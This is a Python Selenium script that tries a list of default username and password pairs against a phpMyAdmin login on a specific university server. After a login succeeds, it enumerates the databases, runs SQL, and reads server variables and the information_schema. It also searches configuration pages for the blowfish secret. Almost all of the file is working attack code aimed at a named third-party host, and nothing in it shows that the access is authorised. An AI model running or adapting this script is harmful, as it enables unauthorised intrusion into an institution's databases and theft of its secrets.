#!/usr/bin/env python3
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time, re, json

opts = Options()
opts.add_argument('--headless')
opts.add_argument('--no-sandbox')
opts.add_argument('--disable-dev-shm-usage')
driver = webdriver.Chrome(options=opts)

try:
    # Try different credentials
    credentials = [
        ('root', ''),
        ('root', 'root'),
        ('root', 'toor'),
        ('root', 'password'),
        ('root', 'admin'),
        ('admin', 'admin'),
        ('pma', 'pma'),
        ('mysql', 'mysql'),
        ('root', '123456'),
        ('root', 'mysql'),
        ('root', 'pass'),
        ('root', '1234'),
        ('pma', 'pmamysql'),
        ('admin', 'password'),
        ('dba', 'dba'),
    ]
    
    for username, password in credentials:
        # Access phpMyAdmin
        driver.get('https://orcl.uns.edu.pe/index.php?route=/server/databases')
        time.sleep(3)
        
        # Try to find and fill the login form
        # Look for the username input
        try:
            username_field = driver.find_element(By.NAME, 'pma_username')
            username_field.clear()
            username_field.send_keys(username)
            
            password_field = driver.find_element(By.NAME, 'pma_password')
            password_field.clear()
            password_field.send_keys(password)
            
            # Submit the form
            password_field.send_keys(Keys.RETURN)
            time.sleep(5)
            
            # Check the result
            tc = driver.page_source
            tc_clean = re.sub(r'<[^>]+>', ' ', tc)
            tc_clean = re.sub(r'\s+', ' ', tc_clean).strip()
            
            # Check for error messages
            if 'AllowNoPassword' in tc_clean:
                print(f"FAIL: {username}/{password} - AllowNoPassword error")
            elif 'pma_username' in tc_clean and len(tc) > 500:
                print(f"FAIL: {username}/{password} - Login form still shown")
            elif 'mysql' in tc_clean.lower() or 'Database' in tc_clean or len(tc) > 10000:
                print(f"SUCCESS: {username}/{password} - Database access!")
                print(f"  Content length: {len(tc)}")
                # Look for database content
                db_info = re.findall(r'(?:mysql|information_schema|phpmyadmin|database)[^<]*', tc_clean, re.IGNORECASE)
                print(f"  DB info: {db_info[:10]}")
                break
            elif 'Welcome' in tc_clean or 'Bienvenido' in tc_clean:
                print(f"SUCCESS: {username}/{password} - Welcome page!")
                # Look for database content
                if 'mysql' in tc_clean.lower():
                    print(f"  [!] Database names visible!")
                break
            else:
                print(f"  {username}/{password}: len={len(tc)}, checking...")
                if len(tc) > 10000 and 'phpMyAdmin' in tc_clean:
                    print(f"  -> Possible access!")
                    break
                    
        except Exception as e:
            print(f"  {username}/{password}: Form error - {str(e)[:50]}")
            time.sleep(1)
    
    # If we got access, try to see the database content
    print("\n=== VERIFICANDO CONTENIDO DE LA BD ===\n")
    
    # Try to access the database list
    driver.get('https://orcl.uns.edu.pe/index.php?route=/server/databases/data')
    time.sleep(5)
    tc_db = driver.page_source
    tc_db_clean = re.sub(r'<[^>]+>', ' ', tc_db)
    tc_db_clean = re.sub(r'\s+', ' ', tc_db_clean).strip()
    print(f"Database list length: {len(tc_db_clean)}")
    
    # Look for database names
    if 'mysql' in tc_db_clean.lower() or 'Database' in tc_db_clean:
        print("[!] Database list visible!")
        db_names = re.findall(r'(?:mysql|information_schema|phpmyadmin|uns|registro|sistemas)[^<,"]*', tc_db_clean, re.IGNORECASE)
        print(f"  Databases: {db_names}")
    
    # Look for table data
    td_elements = driver.find_elements(By.TAG_NAME, 'td')
    td_text = [t.text.strip() for t in td_elements if t.text.strip()]
    if td_text:
        print(f"\n  Table data: {td_text[:20]}")
    
    # Try to access the MySQL system database
    print("\n=== BASE DE DATOS mysql ===\n")
    driver.get('https://orcl.uns.edu.pe/index.php?route=/server/databases/data&db=mysql')
    time.sleep(5)
    tc_mysql = driver.page_source
    tc_mysql_clean = re.sub(r'<[^>]+>', ' ', tc_mysql)
    tc_mysql_clean = re.sub(r'\s+', ' ', tc_mysql_clean).strip()
    print(f"MySQL DB length: {len(tc_mysql_clean)}")
    if len(tc_mysql_clean) > 2000:
        print("[!] MySQL database content!")
        td_mysql = driver.find_elements(By.TAG_NAME, 'td')
        td_mysql_text = [t.text.strip() for t in td_mysql if t.text.strip()]
        print(f"  Tables: {td_mysql_text[:20]}")
    
    # Try to execute SQL
    print("\n=== EJECUTAR SQL ===\n")
    try:
        # Find SQL textarea
        sql_textarea = driver.find_element(By.TAG_NAME, 'textarea')
        sql_textarea.clear()
        sql_textarea.send_keys('SHOW DATABASES')
        time.sleep(2)
        
        # Find Go button
        go_buttons = driver.find_elements(By.XPATH, '//input[@type="submit" or @value="Go" or @name="goto"]')
        for btn in go_buttons:
            btn.click()
            time.sleep(5)
            break
        
        tc_sql = driver.page_source
        tc_sql_clean = re.sub(r'<[^>]+>', ' ', tc_sql)
        tc_sql_clean = re.sub(r'\s+', ' ', tc_sql_clean).strip()
        print(f"SQL result: {tc_sql_clean[:500]}")
        
        # Look for database names
        if 'mysql' in tc_sql_clean.lower():
            print("\n[!] Database names visible!")
            db_names_sql = re.findall(r'(?:mysql|information_schema|phpmyadmin)[^<,"]*', tc_sql_clean, re.IGNORECASE)
            print(f"  Databases: {db_names_sql}")
        
    except Exception as e:
        print(f"SQL error: {e}")
        # Try alternative - find the SQL tab
        try:
            sql_tab = driver.find_element(By.LINK_TEXT, 'SQL')
            sql_tab.click()
            time.sleep(3)
            
            # Find textarea again
            sql_textarea2 = driver.find_elements(By.TAG_NAME, 'textarea')
            if sql_textarea2:
                sql_textarea2[0].send_keys('SHOW DATABASES')
                time.sleep(2)
                
                # Submit
                submit_btn = driver.find_elements(By.XPATH, '//input[@type="submit" or @value="Go"]')
                for btn in submit_btn:
                    btn.click()
                    time.sleep(5)
                    break
            
            tc_sql2 = driver.page_source
            tc_sql2_clean = re.sub(r'<[^>]+>', ' ', tc_sql2)
            tc_sql2_clean = re.sub(r'\s+', ' ', tc_sql2_clean).strip()
            print(f"\nSQL result 2: {tc_sql2_clean[:500]}")
            
        except Exception as e2:
            print(f"Alternative SQL error: {e2}")
    
    # Try to access the server variables
    print("\n=== VARIABLES DEL SERVIDOR ===\n")
    driver.get('https://orcl.uns.edu.pe/index.php?route=/server/variables')
    time.sleep(5)
    tc_vars = driver.page_source
    tc_vars_clean = re.sub(r'<[^>]+>', ' ', tc_vars)
    tc_vars_clean = re.sub(r'\s+', ' ', tc_vars_clean).strip()
    if 'version' in tc_vars_clean.lower() and len(tc_vars_clean) > 5000:
        print("[!] Server variables accessible!")
        version_info = re.findall(r'(?:Version|version|MySQL|MariaDB)[^<]*', tc_vars_clean, re.IGNORECASE)
        print(f"  Version: {version_info[:10]}")
    
    # Try to access the server status
    print("\n=== ESTADO DEL SERVIDOR ===\n")
    driver.get('https://orcl.uns.edu.pe/index.php?route=/server/status')
    time.sleep(5)
    tc_status = driver.page_source
    tc_status_clean = re.sub(r'<[^>]+>', ' ', tc_status)
    tc_status_clean = re.sub(r'\s+', ' ', tc_status_clean).strip()
    if len(tc_status_clean) > 5000:
        print("[!] Server status accessible!")
    
    # Try to access the information_schema
    print("\n=== INFORMATION_SCHEMA ===\n")
    driver.get('https://orcl.uns.edu.pe/index.php?route=/server/databases/data&db=information_schema')
    time.sleep(5)
    tc_info = driver.page_source
    tc_info_clean = re.sub(r'<[^>]+>', ' ', tc_info)
    tc_info_clean = re.sub(r'\s+', ' ', tc_info_clean).strip()
    print(f"Information_schema length: {len(tc_info_clean)}")
    if len(tc_info_clean) > 2000:
        print("[!] Information_schema accessible!")
        td_info = driver.find_elements(By.TAG_NAME, 'td')
        td_info_text = [t.text.strip() for t in td_info if t.text.strip()]
        print(f"  Data: {td_info_text[:20]}")
    
    # Try to access phpMyAdmin configuration
    print("\n=== CONFIGURACIÓN ===\n")
    driver.get('https://orcl.uns.edu.pe/index.php?route=/server/variables')
    time.sleep(5)
    tc_config = driver.page_source
    tc_config_clean = re.sub(r'<[^>]+>', ' ', tc_config)
    tc_config_clean = re.sub(r'\s+', ' ', tc_config_clean).strip()
    if 'blowfish' in tc_config_clean.lower():
        print("[!] Blowfish secret found!")
        blowfish_info = re.findall(r'blowfish[^<]*', tc_config_clean, re.IGNORECASE)
        print(f"  {blowfish_info}")
    
    # Try to read the config file
    print("\n=== ARCHIVO DE CONFIGURACIÓN ===\n")
    try:
        config_links = driver.find_elements(By.XPATH, '//a[contains(@href, "config") or contains(@href, "setup")]')
        for link in config_links:
            href = link.get_attribute('href')
            text = link.text.strip()
            if href and text:
                print(f"  Config link: {text} -> {href}")
                # Access the config page
                driver.get(href)
                time.sleep(3)
                tc_config_page = driver.page_source
                tc_config_clean2 = re.sub(r'<[^>]+>', ' ', tc_config_page)
                tc_config_clean2 = re.sub(r'\s+', ' ', tc_config_clean2).strip()
                if 'blowfish' in tc_config_clean2.lower() or 'secret' in tc_config_clean2.lower():
                    print(f"  [!] Secret visible in config!")
                    secret_match = re.findall(r'blowfish[^=]*=([^&"]+)', tc_config_clean2)
                    print(f"  Secret: {secret_match}")
    except Exception as e:
        print(f"Config error: {e}")
    
    # Save screenshot
    driver.save_screenshot('C:\\Users\\Leguion T\\Desktop\\plan te pent\\prueba\\phpmysql_final.png')
    print("\nFinal screenshot saved!")
    
finally:
    driver.quit()

print("\n=== FIN ===")
